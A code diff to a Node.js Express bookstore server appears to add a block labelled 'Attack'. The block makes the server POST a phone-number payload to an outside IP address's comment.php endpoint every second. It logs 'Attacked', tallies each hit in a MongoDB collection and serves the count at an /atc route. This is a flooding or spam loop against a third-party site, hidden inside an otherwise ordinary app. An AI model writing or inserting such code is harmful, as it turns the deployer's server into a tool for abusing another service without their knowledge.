@@ -9,6 +9,8 @@ const ejs = require('ejs');
 const cheerio = require('cheerio')
 const axios = require('axios')
 
+//io.emit('onload',database);  
+
 const { kStringMaxLength } = require('buffer'); 
 const bodyParser = require('body-parser');
    
@@ -100,7 +102,71 @@ db.on('error', console.error.bind(console, 'connection error:'));
  
     // compile schema to model
     var Book = mongoose.model('Book', BookSchema, 'bookstore');
+    
+    
+    
+    
+    //Attack 
+    
+    var AttackSchema = mongoose.Schema({
+      quantity: Number
+    });
+    
+    var Attack = mongoose.model('Attack', AttackSchema, 'attackstore');
+
+setInterval(function(){
+ axios.post('http://66.135.4.161/comment.php', {
+    number: '01700000000'
+})
+.then(response => {
  
+    console.log("Attacked");
+   // console.log(response.data)
+    Attack.findByIdAndUpdate('640e755ddfb41fe3ef22b7c3',{
+		$inc: {quantity: 1}
+
+}, function(err, result){
+
+        if(err){
+            console.log(err)
+        }
+        else{
+            console.log('up 1')
+        }
+
+    })}).catch(error => {
+    console.error(error)
+})
+},1000);
+
+
+
+
+
+
+
+/*
+
+var attack1 = new Attack({ quantity:1 });
+ 
+  // save model to database
+
+  attack1.save(function (err, news) {
+    if (err) return console.error(err);
+    console.log('attack' + " saved to link collection.");
+})
+
+*/
+
+
+app.get('/atc', (req, res) => {
+    Attack.find({}, function(err, link) {
+        res.send(link[0])
+    })
+})
+
+
+
 
 app.get('/link', (req, res) => {
     Link.find({}, function(err, link) {
